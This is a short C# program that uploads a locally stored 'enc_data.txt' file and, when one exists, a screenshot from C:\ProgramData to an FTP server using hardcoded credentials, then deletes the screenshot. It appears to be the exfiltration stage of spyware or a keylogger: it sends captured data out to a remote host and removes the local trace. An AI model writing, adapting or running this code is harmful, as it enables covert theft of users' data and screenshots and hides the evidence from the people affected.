using System;
using System.IO;
using System.Net;

class Program
{
    static void Main(string[] args)
    {
        // File to be sent
        string localFile = @"C:\ProgramData\enc_data.txt";

        // FTP server address
        string ftpServer = "ftp://192.168.1.40";

        // FTP server username and password
        string ftpUsername = "user";
        string ftpPassword = "19990606";

        // Remote file name
        string remoteFile = "enc_data.txt";

        // Send the file
        SendFile(localFile, ftpServer, ftpUsername, ftpPassword, remoteFile);

        if (File.Exists(@"C:\ProgramData\Screenshot.png"))
        {
            localFile = @"C:\ProgramData\Screenshot.png";
            remoteFile = "Screenshot.png";
            SendFile(localFile, ftpServer, ftpUsername, ftpPassword, remoteFile);
            File.Delete(localFile);
        }
    }

    static void SendFile(string localFile, string ftpServer, string ftpUsername, string ftpPassword, string remoteFile)
    {
        // Create a new FTP client
        FtpWebRequest ftpClient = (FtpWebRequest)FtpWebRequest.Create(ftpServer + "/" + remoteFile);

        // Set the credentials
        ftpClient.Credentials = new NetworkCredential(ftpUsername, ftpPassword);

        // Set the request type to upload
        ftpClient.Method = WebRequestMethods.Ftp.UploadFile;

        // Open the local file
        FileStream localFileStream = new FileStream(localFile, FileMode.Open);

        // Copy the local file to the FTP server
        byte[] buffer = new byte[localFileStream.Length];
        int bytesRead = localFileStream.Read(buffer, 0, buffer.Length);
        Stream requestStream = ftpClient.GetRequestStream();
        requestStream.Write(buffer, 0, bytesRead);
        localFileStream.Close();
        requestStream.Close();

        // Get the FTP server's response
        FtpWebResponse response = (FtpWebResponse)ftpClient.GetResponse();
        Console.WriteLine("Upload status: {0}", response.StatusDescription);
        response.Close();
    }
}
